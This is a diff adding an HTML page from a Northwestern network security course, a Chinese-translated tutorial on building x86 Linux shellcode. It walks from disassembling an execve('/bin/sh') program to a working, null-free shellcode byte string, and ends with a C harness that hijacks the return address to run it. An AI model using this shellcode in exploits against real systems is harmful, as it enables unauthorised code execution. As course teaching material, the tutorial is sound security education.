@@ -1,0 +1,461 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html><head>
+    <title>Network Penetration and Security — EECS 354 </title>
+    <meta http-equiv="Content-type" content="text/html; charset=UTF-8">
+    <link href="style/global.css" rel="stylesheet" type="text/css">
+    
+<link href="style/wiki.css" rel="stylesheet" type="text/css">
+
+</head>
+<body>
+
+  <div id="header">
+    <h1>Network Penetration and Security</h1>
+    <h2>Northwestern EECS, Fall Quarter 2014</h2>
+  </div>
+  <ul id="navigation">
+    
+    <li><a href="http://hamsa.cs.northwestern.edu/">Home</a></li>
+    <li><a href="http://hamsa.cs.northwestern.edu/schedule/">Schedule</a></li>
+    <li><a href="http://hamsa.cs.northwestern.edu/readings/">Readings</a></li>
+    <li><a href="http://hamsa.cs.northwestern.edu/projects/">Projects</a></li>
+
+    
+    
+    <li class="right"><a href="http://hamsa.cs.northwestern.edu/login/">Login</a></li>
+    
+    <li class="right"><a href="http://groups.google.com/group/nuctf">Newsgroup</a></li>
+  </ul>
+  
+  <div id="content">
+    
+  
+  <h1>﻿Shellcode</h1>
+
+<h2>Introduction</h2>
+<p>shellcode是用来进行缓冲区溢出攻击的方法。它是以字符串格式保存的二进制机器指令。一般情况下，shellcode很难创建，但非常容易找到。本教程介绍了如何创建shellcode。<br>
+
+</p>
+<p class="note">
+从本教程的想法是取自 Aleph1 的 <a href="http://hamsa.cs.northwestern.edu/media/readings/stack_smashing.pdf"> 堆栈的乐趣</a>。为了能够扩大它的应用范围，它已经被重新修订，它的工作原理同样适用于现代系统 (特别是 Ubuntu 12.04)。
+</p>
+
+<h2>Executing a shell</h2>
+<p>第一项任务是建立一个 C 程序，将执行一个 shell。它应该尽可能的简单。这里是一个非常简单的 C 程序，如下:</p>
+<pre><code>#include &lt;stdio.h&gt;
+int main() { 
+   char *array[2];
+   array[0] = "/bin/sh";
+   array[1] = NULL;
+   execve(array[0], array, NULL);
+   return 0;
+}
+</code></pre><p>编译它，并确保它正常工作。请注意，使用静态编译 (<code>-static</code>)。对于接下来的步骤，这是非常重要的。
+</p>
+<p>它能够按预期工作。现在该程序需要被反编译。为了反编译 <code>execve</code> 函数，它需要被编译到程序。这就是为什么 <code>-static</code> 标志是必要的。<code>gdb</code>是用于反编译的重要工具。
+</p>
+<pre><code>wbyoung@netsec:~$ gdb shell
+(gdb) disass main
+Dump of assembler code for function main:
+0x08048ee0 &lt;+0&gt;:     push   %ebp
+0x08048ee1 &lt;+1&gt;:     mov    %esp,%ebp
+0x08048ee3 &lt;+3&gt;:     and    $0xfffffff0,%esp
+0x08048ee6 &lt;+6&gt;:     sub    $0x20,%esp
+0x08048ee9 &lt;+9&gt;:     movl   $0x80c57a8,0x18(%esp)
+0x08048ef1 &lt;+17&gt;:    movl   $0x0,0x1c(%esp)
+0x08048ef9 &lt;+25&gt;:    mov    0x18(%esp),%eax
+0x08048efd &lt;+29&gt;:    movl   $0x0,0x8(%esp)
+0x08048f05 &lt;+37&gt;:    lea    0x18(%esp),%edx
+0x08048f09 &lt;+41&gt;:    mov    %edx,0x4(%esp)
+0x08048f0d &lt;+45&gt;:    mov    %eax,(%esp)
+0x08048f10 &lt;+48&gt;:    call   0x8053ae0 &lt;execve&gt;
+0x08048f15 &lt;+53&gt;:    mov    $0x0,%eax
+0x08048f1a &lt;+58&gt;:    leave
+0x08048f1b &lt;+59&gt;:    ret
+End of assembler dump.
+(gdb) disass execve
+Dump of assembler code for function execve:
+0x08053ae0 &lt;+0&gt;:     push   %ebx
+0x08053ae1 &lt;+1&gt;:     mov    0x10(%esp),%edx
+0x08053ae5 &lt;+5&gt;:     mov    0xc(%esp),%ecx
+0x08053ae9 &lt;+9&gt;:     mov    0x8(%esp),%ebx
+0x08053aed &lt;+13&gt;:    mov    $0xb,%eax
+0x08053af2 &lt;+18&gt;:    call   *0x80ef5a4
+0x08053af8 &lt;+24&gt;:    cmp    $0xfffff000,%eax
+0x08053afd &lt;+29&gt;:    ja     0x8053b01 &lt;execve+33&gt;
+0x08053aff &lt;+31&gt;:    pop    %ebx
+0x08053b00 &lt;+32&gt;:    ret
+0x08053b01 &lt;+33&gt;:    mov    $0xffffffe8,%edx
+0x08053b07 &lt;+39&gt;:    neg    %eax
+0x08053b09 &lt;+41&gt;:    mov    %gs:0x0,%ecx
+0x08053b10 &lt;+48&gt;:    mov    %eax,(%ecx,%edx,1)
+0x08053b13 &lt;+51&gt;:    or     $0xffffffff,%eax
+0x08053b16 &lt;+54&gt;:    pop    %ebx
+0x08053b17 &lt;+55&gt;:    ret
+End of assembler dump.
+(gdb) quit
+</code></pre><p>其实到底发生了什么?下表说明不同的指令集在干什么。</p>
+<table cellpadding="0" cellspacing="0"><tbody><tr><th>Explanation</th><th>Instructions</th></tr><tr><td>Set up the main function</td><td class="code"> <code>0x08048ee0 &lt;+0&gt;:  push   %esp</code> <code>0x08048ee1 &lt;+1&gt;:  mov   %esp,%ebp</code> <code>0x08048ee3 &lt;+3&gt;:  and   $0xfffffff0,%esp</code> <code>0x08048ee6 &lt;+6&gt;: sub   $0x20,%esp</code></td></tr><tr><td>Move the address of <code>/bin/sh</code> into <code>0x18(%esp)</code> which is <code>array[0]</code></td><td class="code"> <code>0x08048ee9 &lt;+9&gt;: movl   $0x80c57a8,0x18(%esp)</code></td></tr><tr><td>Move <code>NULL</code> into <code>0x1c(%esp)</code> which is <code>array[1]</code></td><td class="code"> <code>0x08048ef1 &lt;+17&gt;: movl   $0x0,0x1c(%esp)</code></td></tr><tr><td>Move the address of the <code>/bin/sh</code> string into <code>eax</code></td><td class="code"> <code>0x08048ef9 &lt;+25&gt;: mov    0x18(%esp),%eax</code></td></tr><tr><td>Push the 3rd argument, a <code>NULL</code> onto the stack</td><td class="code"> <code>0x08048efd &lt;+29&gt;: movl   $0x0,0x8(%esp)</code></td></tr><tr><td>Load the address of the <code>array</code> into <code>edx</code>, then push it onto the stack as the 2nd argument</td><td class="code"> <code>0x08048f05 &lt;+37&gt;: lea    0x18(%esp),%edx</code> <code>0x08048f09 &lt;+41&gt;: mov    %edx,0x4(%esp)</code></td></tr><tr><td>Push address of <code>/bin/sh</code> onto the stack as the 1st argument</td><td class="code"> <code>0x08048f10 &lt;+45&gt;: mov    %eax,(%esp)</code></td></tr><tr><td>Call <code>execve</code> now that the argument list has been built</td><td class="code"> <code>0x08048f10 &lt;+48&gt;: call   0x8053ae0 &lt;execve&gt;</code></td></tr><tr><td>Complete <code>main</code> and return 0</td><td class="code"> <code>0x08048f15 &lt;+53&gt;: mov    $0x0,%eax</code> <code>0x08048f1a &lt;+58&gt;: leave</code> <code>0x08048f1b &lt;+59&gt;: ret</code></td></tr></tbody></table>
+
+<p>通过 <code>main</code>函数中的知识，就可以找出 <code>execve</code> 函数内的内容。
+</p>
+<table cellpadding="0" cellspacing="0"><tbody><tr><th>Explanation</th><th>Instructions</th></tr><tr><td>Setup the <code>execve</code> function</td><td class="code"> <code>0x08053ae0 &lt;+0&gt;:    push   %ebx</code></td></tr><tr><td>This moves the 3rd argument, a <code>NULL</code>, into <code>edx</code></td><td class="code"> <code>0x08053ae1 &lt;+1&gt;:    mov    0x10(%esp),%edx</code></td></tr><tr><td>This moves the 2nd argument, the address of the <code>array</code>, into <code>ecx</code></td><td class="code"> <code>0x08053ae5 &lt;+5&gt;:    mov    0xc(%esp),%ecx</code></td></tr><tr><td>This moves the 1st argument, the address of <code>/bin/sh</code> into the <code>ebx</code> register</td><td class="code"> <code>0x08053ae9 &lt;+9&gt;:   mov    0x8(%esp),%ebx</code></td></tr><tr><td>Move <code>0xb</code> into the <code>eax</code> register, then execute an interrupt to enter kernel mode. The simplest instruction for an interrupt is <code>int 0x80</code> though in this case it's hidden in a wrapper function at <code>0x80ef5a3</code>.</td><td class="code"> <code>0x08053aed &lt;+13&gt;:   mov    $0xb,%eax</code> <code>0x08053af2 &lt;+18&gt;:   call   *0x80ef5a4</code></td></tr><tr><td>The
+ rest of this is not important in generating our shellcode since the 
+kernel has already taken over and started the requested program</td><td class="code"> <code>0x08053af8 &lt;+24&gt;:   cmp    $0xfffff000,%eax</code> <code>0x08053afd &lt;+29&gt;:   ja    0x8053b01 &lt;execve+33&gt;</code> <code>0x08053b01 &lt;+31&gt;:   pop    %ebx</code> <code>0x08053b00 &lt;+32&gt;:   ret</code></td></tr></tbody></table>
+
+<p>这里有很多的指令。不用说，不是所有的指令都是需要的。shellcode越短，就越健壮。</p>
+<p>首先，以下内容是必须存在于内存中的：</p>
+<ul>
+ <li>以null结尾的字符串，<code>/bin/sh</code>
+ </li>
+
+ <li>
+字符串的地址是以一个4字节的<code>NULL</code>为结尾的 (这是 <code>数组</code>)
+</li>
+
+ <li><code>数组</code>的地址
+ </li>
+</ul>
+<p>然后所有需要做的事情如下：</p>
+<ul>
+ <li>把<code>/bin/sh</code>的地址放到<code>ebx</code>
+ </li>
+
+ <li>把<code>array</code>的地址放到<code>ecx</code>
+ </li>
+
+ <li>一个<code>NULL</code>放到<code>edx</code>
+ </li>
+
+ <li>
+     <code>0xb</code>放到<code>eax</code>
+ </li>
+
+ <li>调用
+     <code>int 0x80</code></li>
+</ul>
+<p>如果 <code>execve</code> 调用失败，程序应该干净利落地退出。要做到这一点，可以将调用exit添加到shellcode的末尾。它不会造成太多额外的麻烦。
+</p>
+<p>下面是一个调用exit的示例程序。</p>
+<pre><code>#include &lt;stdlib.h&gt; 
+int main() { 
+  exit(0);
+  return 0;
+}
+</code></pre><p>使用相同的编译选项进行编译，它就能够如预期地工作。</p>
+<pre><code>wbyoung@netsec:~$ gcc -g -static -o exit exit.c
+wbyoung@netsec:~$ ./exit
+</code></pre><p>实际上，这里唯一重要的函数是 <code>_exit</code>，它是由 <code>__run_exit_handlers</code>(未显示)调用的，间接地由 <code>exit</code> 调用。在下面的输出中，它被放到了底部。
+</p>
+<pre><code>(gdb) disass main
+Dump of assembler code for function main:
+0x08048ee0 &lt;+0&gt;:     push   %ebp
+0x08048ee1 &lt;+1&gt;:     mov    %esp,%ebp
+0x08048ee3 &lt;+3&gt;:     and    $0xfffffff0,%esp
+0x08048ee6 &lt;+6&gt;:     sub    $0x10,%esp
+0x08048ee9 &lt;+9&gt;:     movl   $0x0,(%esp)
+0x08048ef0 &lt;+16&gt;:    call   0x8049770 &lt;exit&gt;
+End of assembler dump.
+(gdb) disass exit
+Dump of assembler code for function exit:
+0x08049770 &lt;+0&gt;:     sub    $0x1c,%esp
+0x08049773 &lt;+3&gt;:     mov    0x20(%esp),%eax
+0x08049777 &lt;+7&gt;:     movl   $0x1,0x8(%esp)
+0x0804977f &lt;+15&gt;:    movl   $0x80ef06c,0x4(%esp)
+0x08049787 &lt;+23&gt;:    mov    %eax,(%esp)
+0x0804978a &lt;+26&gt;:    call   0x8049680 &lt;__run_exit_handlers&gt;
+End of assembler dump.
+(gdb) disass _exit
+Dump of assembler code for function _exit:
+0x08053a9c &lt;+0&gt;:     mov    0x4(%esp),%ebx
+0x08053aa0 &lt;+4&gt;:     mov    $0xfc,%eax
+0x08053aa5 &lt;+9&gt;:     call   *0x80ef5a4
+0x08053aab &lt;+15&gt;:    mov    $0x1,%eax
+0x08053ab0 &lt;+20&gt;:    int    $0x80
+0x08053ab2 &lt;+22&gt;:    hlt
+End of assembler dump.
+(gdb)
+</code></pre><p>退出程序其实是很简单的。退出代码 (0，表明该程序正常地退出) 是作为一个参数传递，并且最终存储在 <code>ebx</code> 中。系统调用码，<code>0x1</code>，存储在 <code>eax</code> 中。然后程序将调用 <code>int 0x80</code> 切换到内核态。
+</p>
+
+<h2>Compiling the assembly instructions</h2>
+<p>现在已经了解了需要的基本知识，我们需要能够完整的应用它们。为了将<code>/bin/sh</code>加载到内存中，需要:
+</p>
+<ol>
+ <li>把<code>/bin/sh</code>的地址放到<code>ebx</code>
+ </li>
+
+ <li>确保<code>/bin/sh</code>以null为结尾，即<code>'\0'</code>
+ </li>
+
+ <li>把<code>/bin/sh</code>的地址放到<code>array[0]</code>
+ </li>
+
+ <li>把四个字节的<code>NULL</code>放到<code>array[1]</code>
+ </li>
+
+ <li>把数组的地址放到<code>ecx</code>
+ </li>
+
+ <li>把<code>NULL</code>放到<code>edx</code>
+ </li>
+
+ <li>把<code>0xb</code>放到<code>eax</code>
+ </li>
+
+ <li>调用<code>int 0x80</code>
+ </li>
+
+ <li>把<code>0x0</code>存储到<code>ebx</code>
+ </li>
+
+ <li>把<code>0x1</code>存储到<code>eax</code>
+ </li>
+
+ <li>调用<code>int 0x80</code>
+ </li>
+</ol>
+<p>粗略地说明：</p>
+<pre><code>???? %ebx                        # get string into ebx
+movb $0x0, string-end(%ebx)      # null terminate string
+movl %ebx, array-0-offset(%ebx)  # store address of string
+movl $0x0, array-1-offset(%ebx)  # null terminate array
+movl $0x0, %edx                  # put a null in edx
+leal array-0-offset(%ebx), %ecx  # put array in ecx
+movl $0xb, %eax                  # set syscall number for execve
+int  $0x80                       # trap to kernel
+movl $0x0, %ebx                  # set exit status of 0
+movl $0x1, %eax                  # set syscall number for exit
+int  $0x80                       # trap to kernel
+.string "/bin/sh"
+</code></pre><p>但是， <code>/bin/sh</code> 字符串的地址是未知的。它可以在程序中的任何位置，还没有办法知道。这里有有一个小技巧，可以用来确定地址。如果该程序首先跳转到这些指令 (只是在字符串之前) 的结束，再回到起点，然后<code>call</code>之后指令后将被存储在堆栈上。大会将看起来像这样:
+</p>
+<pre><code>jmp call-offset
+...
+call jump-offset
+.string "/bin/sh"
+</code></pre><p>首先执行指令的是 <code>jmp</code> 指令。这将导致机器跳转到 <code>call</code> 指令。当执行 <code>call</code> 指令，机器将当前指令之后的地址放到它的堆栈上。所有的call都是这样做的， <code>ret</code> 指令调用时，程序就知道下一步执行哪一天指令了。在这个例子中，它将开始执行 <code>/bin/sh</code>。显然这并不对应于有效的指令，程序将会崩溃。但 <code>ret</code>永远不会被调用，因为该程序会成功调用 <code>execve</code> 或调用 <code>exit</code>。
+</p>
+<p>现在，字符串的地址是在堆栈上，它需要通过 <code>popl</code> 指令检索。
+</p>
+<pre><code>jmp call-offset                  # (2)
+popl %ebx                        # (1) get string into ebx
+movb $0x0, string-len(%ebx)      # (4) null terminate string
+movl %ebx, array-0-offset(%ebx)  # (3) store address of string
+movl $0x0, array-1-offset(%ebx)  # (7) null terminate array
+movl $0x0, %edx                  # (5) put a null in edx
+leal array-0-offset(%ebx), %ecx  # (3) put array in ecx
+movl $0xb, %eax                  # (5) set syscall number for execve
+int  $0x80                       # (2) trap to kernel
+movl $0x0, %ebx                  # (5) set exit status of 0
+movl $0x1, %eax                  # (5) set syscall number for exit
+int  $0x80                       # (2) trap to kernel
+call jump-offset                 # (5)
+.string "/bin/sh"
+</code></pre><p>每个指令所需的字节数都已列入上述的指令中。</p>
+<p>这是相当多的汇编代码，但偏移量没有确定。若要知道偏移量是多少，需要取得该数组在内存中的位置。因为该程序不会执行任何其他指令，工作程序的地址空间中的任何内存位置都是有效的。一个好的取值是<code>/bin/sh</code> 字符串的地址。
+</p>
+<p>声明 4 字节地址的<code>/bin/sh</code>以及<code>addr</code> 与 4字节的<code>NULL</code> 地址，填充 <code>null</code> ，目标是为了布置这样的内存:
+</p>
+<pre><code>/bin/sh\0addrnull
+</code></pre><ul>
+ <li>
+     <code>string-len</code>是<code>0x7</code>字符串的长度为7</li>
+
+ <li>
+     <code>array-0-offset</code>是<code>0x8</code>字符串null字符之后的地址</li>
+
+ <li>
+     <code>array-1-offset</code>是<code>0xc</code><code>array-0-offset</code>之后的4个字节
+ </li>
+</ul>
+<p>为清楚起见，用C来写是这样的：</p>
+<pre><code>char string[16] = "/bin/sh";
+
+char *write-null-byte = string + STRING-LEN;
+int *write-string-addr = string + ARRAY-0-OFFSET;
+int *write-null = string + ARRAY-1-OFFSET;
+
+*write-null-byte = '\0';
+*write-string-addr = (int)string;
+*write-null = 0;
+</code></pre><p>为了解决跳转的偏移量问题，计算从main直到调用指令的字节数。结果是47，所以跳偏移量应 <code>main + 0x2f</code>。由于调用需要执行跳转指令之后的指令，其偏移量应该是 5，<code>main + 0x5</code>。替换所有的偏移量，汇编代码是:
+</p>
+<pre><code>main:
+  jmp  main+0x2f                 # (5)
+  popl %ebx                      # (1) get string into ebx
+  movb $0x0, 0x7(%ebx)           # (4) null terminate string
+  movl %ebx, 0x8(%ebx)           # (3) store address of string
+  movl $0x0, 0xc(%ebx)           # (7) null terminate array
+  movl $0x0, %edx                # (5) put a null in edx
+  leal 0x8(%ebx), %ecx           # (3) put array in ecx
+  movl $0xb, %eax                # (5) set syscall number for execve
+  int  $0x80                     # (2) trap to kernel
+  movl $0x0, %ebx                # (5) set exit status of 0
+  movl $0x1, %eax                # (5) set syscall number for exit
+  int  $0x80                     # (2) trap to kernel
+  call main+0x5                  # (5)
+  .string "/bin/sh"
+.globl main
+  .type   main, @function
+</code></pre><p>这是很容易使用 <code>gdb</code> 进行编译。只是把它放在一个文件扩展名为 <code>.s</code>的文件，<code>gdb</code> 知道它是汇编指令。添加的符号上定义了一个main 函数，所以程序能够正确编译。
+</p>
+<pre><code>wbyoung@netsec:~$ gcc -g -o shellcode shellcode.s
+</code></pre><p>使用 <code>gdb</code> 反汇编可以保证 <code>gcc</code> 不会修改任何东西。
+</p>
+<pre><code>wbyoung@netsec:~$ gdb shellcode
+(gdb) disass main
+Dump of assembler code for function main:
+0x080483b4 &lt;+0&gt;:     jmp    0x80483e3 &lt;main+47&gt;
+0x080483b9 &lt;+5&gt;:     pop    %ebx
+0x080483ba &lt;+6&gt;:     movb   $0x0,0x7(%ebx)
+0x080483be &lt;+10&gt;:    mov    %ebx,0x8(%ebx)
+0x080483c1 &lt;+13&gt;:    movl   $0x0,0xc(%ebx)
+0x080483c8 &lt;+20&gt;:    mov    $0x0,%edx
+0x080483cd &lt;+25&gt;:    lea    0x8(%ebx),%ecx
+0x080483d0 &lt;+28&gt;:    mov    $0xb,%eax
+0x080483d5 &lt;+33&gt;:    int    $0x80
+0x080483d7 &lt;+35&gt;:    mov    $0x0,%ebx
+0x080483dc &lt;+40&gt;:    mov    $0x1,%eax
+0x080483e1 &lt;+45&gt;:    int    $0x80
+0x080483e3 &lt;+47&gt;:    call   0x80483b9 &lt;main+5&gt;
+0x080483e8 &lt;+52&gt;:    das
+0x080483e9 &lt;+53&gt;:    bound  %ebp,0x6e(%ecx)
+0x080483ec &lt;+56&gt;:    das
+0x080483ed &lt;+57&gt;:    jae    0x8048457
+0x080483ef &lt;+59&gt;:    add    %dl,0x57(%ebp)
+End of assembler dump.
+</code></pre><p>这看起来很好，但如果您尝试运行该程序，它将会导致段错误。原因是该程序修改其本身。在编译时通过这种方式，指令存储(以及字符串) 在程序的文本/代码部分。现代内核标记为这一节为只读。当程序试图在结束了 <code>/bin/sh</code>写入 null 字节时，它会崩溃。
+</p>
+<p>在执行的时候堆栈是正常的。为了能够快速地准备堆栈，<code>objdump</code> 将输出的二进制指令。
+</p>
+<pre><code>wbyoung@netsec:~$ objdump -d shellcode | grep -A20 '&lt;main&gt;'
+080483b4 &lt;main&gt;:
+ 80483b4:   e9 2a 00 00 00          jmp    80483e3 &lt;main+0x2f&gt;
+ 80483b9:   5b                      pop    %ebx
+ 80483ba:   c6 43 07 00             movb   $0x0,0x7(%ebx)
+ 80483be:   89 5b 08                mov    %ebx,0x8(%ebx)
+ 80483c1:   c7 43 0c 00 00 00 00    movl   $0x0,0xc(%ebx)
+ 80483c8:   ba 00 00 00 00          mov    $0x0,%edx
+ 80483cd:   8d 4b 08                lea    0x8(%ebx),%ecx
+ 80483d0:   b8 0b 00 00 00          mov    $0xb,%eax
+ 80483d5:   cd 80                   int    $0x80
+ 80483d7:   bb 00 00 00 00          mov    $0x0,%ebx
+ 80483dc:   b8 01 00 00 00          mov    $0x1,%eax
+ 80483e1:   cd 80                   int    $0x80
+ 80483e3:   e8 d1 ff ff ff          call   80483b9 &lt;main+0x5&gt;
+ 80483e8:   2f                      das    
+ 80483e9:   62 69 6e                bound  %ebp,0x6e(%ecx)
+ 80483ec:   2f                      das    
+ 80483ed:   73 68                   jae    8048457 &lt;__libc_csu_init+0x67&gt;
+    ...
+
+080483f0 &lt;__libc_csu_fini&gt;:
+</code></pre><p>在call 指令之前一切都是正常的指令。在它之后是字符串 <code>/bin/sh</code>，可以替换的实际的字符串 <code>/bin/sh</code>。shellcode可以在一个简单的程序进行测试。
+</p>
+<pre><code>char shellcode[] = "\xe9\x2a\x00\x00\x00\x5b\xc6\x43\x07\x00"
+  "\x89\x5b\x08\xc7\x43\x0c\x00\x00\x00\x00\xba\x00\x00\x00\x00"
+  "\x8d\x4b\x08\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00"
+  "\xb8\x01\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff\xff/bin/sh";
+
+void shell() {
+  int *ret; 
+  ret = (int *)&amp;ret + 2;
+  (*ret) = (int)shellcode;
+}
+
+int main() { 
+   shell();
+   return 0;
+}
+</code></pre><p>现在只要编译（允许堆栈运行）并运行它：</p>
+<pre><code>wbyoung@netsec:~$ gcc -g -z execstack -o shellcode shellcode.c
+wbyoung@netsec:~$ ./shellcode
+$ exit
+wbyoung@netsec:~$
+</code></pre><p>这能够正常运行。剩下的是移除shellcode指令的null字符。</p>
+
+<h2>移除null字符</h2>
+<p>许多缓冲区溢出漏洞依靠字符串的结尾null字符。如果有在shellcode中有null字符，字符串处理函数在遇到第一个null就会停止，所
+有的shellcode代码不会进入程序。shellocde中的空字符很容易被替换。下表包括那些导致问题的说明和他们的解决方案。</p>
+<table cellpadding="0" cellspacing="0"><tbody><tr><th>Problem</th><th>Replacement</th></tr><tr><td class="code"> <code>jmp main+0x2f</code></td><td>The compiler compiles this into a five byte long jump instruction, <code>e9 2a 00 00 00</code>.
+ The address in the instruction begins with null characters. Using the 
+short jump instruction, the instruction can be 2 bytes long: <code>eb 2a</code>. This change has to be made after the code is compiled because there's no way to instruct the compiler to use a short jump.</td></tr><tr><td class="code"> <code>movb $0x0, 0x7(%ebx)</code> <code>movl $0x0, 0xc(%ebx)</code> <code>movl $0x0, %edx</code></td><td class="code"> <code>xorl %eax, %eax</code> <code>movb %al,  0x7(%ebx)</code> <code>movl %eax, 0xc(%ebx)</code> <code>movl %eax, %edx</code></td></tr><tr><td class="code"> <code>movl $0xb, %eax</code></td><td class="code"> <code>movb $0xb, %al</code></td></tr><tr><td class="code"> <code>movl $0x0, %ebx</code> <code>movl $0x1, %eax</code></td><td class="code"> <code>xorl %ebx, %ebx</code> <code>movl %ebx, %eax</code> <code>inc  %eax</code></td></tr></tbody></table>
+
+<p>现在汇编指令变成了：</p>
+<pre><code>main:
+  jmp  main+0x21                 # (5)
+  popl %ebx                      # (1) get string into ebx
+  xorl %eax, %eax                # (2) clear the eax register
+  movb %al,  0x7(%ebx)           # (3) null terminate string
+  movl %ebx, 0x8(%ebx)           # (3) store address of string
+  movl %eax, 0xc(%ebx)           # (3) null terminate array
+  movl %eax, %edx                # (2) put a null in edx
+  leal 0x8(%ebx), %ecx           # (3) put array in ecx
+  movb $0xb, %al                 # (2) set syscall number for execve
+  int  $0x80                     # (2) trap to kernel
+  xorl %ebx, %ebx                # (2) set exit status of 0
+  movl %ebx, %eax                # (2) clear the eax register
+  inc  %eax                      # (1) set syscall number for exit
+  int  $0x80                     # (2) trap to kernel
+  call main+0x5                  # (5)
+  .string "/bin/sh"
+.globl main
+  .type   main, @function
+</code></pre><p>注意跳转偏移量已经发生改变，因为指令被修改了。汇编这段代码，然后使用 <code>objdump</code> 将导致以下结果:
+</p>
+<pre><code>wbyoung@netsec:~$ gcc -g -o shellcode shellcode.s
+wbyoung@netsec:~$ objdump -d shellcode | grep -A20 '&lt;main&gt;'
+080483b4 &lt;main&gt;:
+ 80483b4:   e9 1c 00 00 00          jmp    80483d5 &lt;main+0x21&gt;
+ 80483b9:   5b                      pop    %ebx
+ 80483ba:   31 c0                   xor    %eax,%eax
+ 80483bc:   88 43 07                mov    %al,0x7(%ebx)
+ 80483bf:   89 5b 08                mov    %ebx,0x8(%ebx)
+ 80483c2:   89 43 0c                mov    %eax,0xc(%ebx)
+ 80483c5:   89 c2                   mov    %eax,%edx
+ 80483c7:   8d 4b 08                lea    0x8(%ebx),%ecx
+ 80483ca:   b0 0b                   mov    $0xb,%al
+ 80483cc:   cd 80                   int    $0x80
+ 80483ce:   31 db                   xor    %ebx,%ebx
+ 80483d0:   89 d8                   mov    %ebx,%eax
+ 80483d2:   40                      inc    %eax
+ 80483d3:   cd 80                   int    $0x80
+ 80483d5:   e8 df ff ff ff          call   80483b9 &lt;main+0x5&gt;
+ 80483da:   2f                      das    
+ 80483db:   62 69 6e                bound  %ebp,0x6e(%ecx)
+ 80483de:   2f                      das    
+ 80483df:   73 68                   jae    8048449 &lt;__libc_csu_init+0x59&gt;
+ 80483e1:   00 90 90 90 90 90       add    %dl,-0x6f6f6f70(%eax)
+</code></pre><p>正如所预料的，除了跳转指令以外的所有的null值都已被删除。此指令被替换为 <code>eb 1c</code>。shellcode变为:
+</p>
+<pre><code>char shellcode[] = 
+  "\xeb\x1c\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43"
+  "\x0c\x89\xc2\x8d\x4b\x08\xb0\x0b\xcd\x80\x31\xdb\x89"
+  "\xd8\x40\xcd\x80\xe8\xdf\xff\xff\xff/bin/sh";
+</code></pre><p class="note">
+   The offsets for the jump and call don't need to be changed when changing the jump instruction to <code>eb 1c</code> because they are compiled relative to the instruction and not to the start of <code>main</code>.
+</p>
+<p>在先前的 <code>shellcode.c</code> 编译并运行它。程序显示shellcode能正常工作，并且没有 null 字符。
+</p>
+<pre><code>wbyoung@netsec:~$ gcc -g -z execstack -o shellcode shellcode.c
+wbyoung@netsec:~$ ./shellcode
+$ exit
+wbyoung@netsec:~$
+</code></pre>
+<h2>使用shellcode</h2>
+<p>shellcode被用于缓冲区溢出攻击。若要了解有关如何使用shellcode的详细信息，请阅读有关 <a href="http://hamsa.cs.northwestern.edu/readings/buffer-overflows/"> 缓冲区溢出</a>的内容。
+</p>
+<p class="copyright">
+   Copyright 2008 the following:<br>
+Sam McIngvale <a href="mailto:sam.mcingvale@u.northwestern.edu">sam.mcingvale@u.northwestern.edu</a><br>
+Jim Spadaro <a href="mailto:j-spadaro@northwestern.edu">j-spadaro@northwestern.edu</a><br>
+Whitney Young <a href="mailto:wbyoung@u.northwestern.edu">wbyoung@u.northwestern.edu</a><br>
+All rights reserved.  Permission to reproduce this document in whole or in part must be obtained from the authors.
+</p>
+
+  </div>
+
+
+
+<div id="link64_vdp_tabid" style="display:none;">1000</div></body></html>
